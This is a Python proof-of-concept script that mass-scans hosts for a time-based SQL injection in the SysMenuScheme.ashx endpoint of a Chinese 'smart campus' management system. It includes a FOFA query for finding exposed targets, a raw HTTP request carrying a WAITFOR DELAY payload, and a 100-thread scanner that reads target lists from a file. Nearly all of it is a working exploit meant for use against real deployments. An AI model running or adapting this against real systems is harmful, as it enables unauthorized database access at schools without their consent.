# fofa：title="智慧综合管理平台登入"
"""poc：POST /Module/Kernel/Controller/SysMenuScheme.ashx HTTP/1.1
        Host:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        action=exportExcel&sname=';WAITFOR+DELAY+'0:0:5'--"""


import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
  $$$$$$\   $$$$$$\  $$\       
 $$  __$$\ $$  __$$\ $$ |      
$$ /  \__|$$ /  $$ |$$ |      
\$$$$$$\  $$ |  $$ |$$ |      
\____$$\ $$ |  $$ |$$ |      
$$\   $$ |$$ $$\$$ |$$ |      
 \$$$$$$  |\$$$$$$ / $$$$$$$$\ 
\______/  \___$$$\ \________|
                \___|          
                                                       
                                                       
"""
    print(test)



def main():
    banner()
    # 先处理命令行输入的内容
    # 初始化
    parse = argparse.ArgumentParser(description="智慧校园(安校易)管理系统 SysMenuScheme.ashx 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数进行判断 只能是单个的，要不一个url，或一个文件
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(targes):
    link = '/Module/Kernel/Controller/SysMenuScheme.ashx'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }

    data = "action=exportExcel&sname=';WAITFOR+DELAY+'0:0:5'--"
    
    try:
        res1 = requests.get(url=targes,headers=headers,timeout=10,verify=False)
        print(res1.status_code)
        if res1.status_code == 200:
            res2 =requests.get(url=targes+link,headers=headers,data=data,timeout=10,verify=False)
            if res2.elapsed.total_seconds() >= 5:
                print(f"[+]该{targes}存在sql注入")
                # with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                #     f.write(f"[+]该{targes}存在sql注入"+'\n')
            else:
                print(f"[-]该{targes}不存在sql注入")
    except Exception as e:
        print(f"该{targes}存在问题，请手工进行测试")
        print(e)


# 函数入口
if __name__ == "__main__":
    main()